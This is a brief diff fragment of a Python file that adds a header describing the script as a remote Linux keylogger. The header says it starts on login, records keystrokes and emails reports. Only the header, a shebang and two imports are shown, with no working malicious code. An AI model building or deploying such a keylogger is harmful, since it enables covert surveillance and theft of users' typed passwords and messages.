@@ -1,5 +1,9 @@
 #!/usr/bin/env python
 
+# Userspace remote keylogger for Linux, works with X, starts on user login, logs key stikes to a file and sends report by email.
+# By Zaid Sabih / Zaid Al Quraishi
+
+
 from subprocess import call
 from shutil import copyfile
 
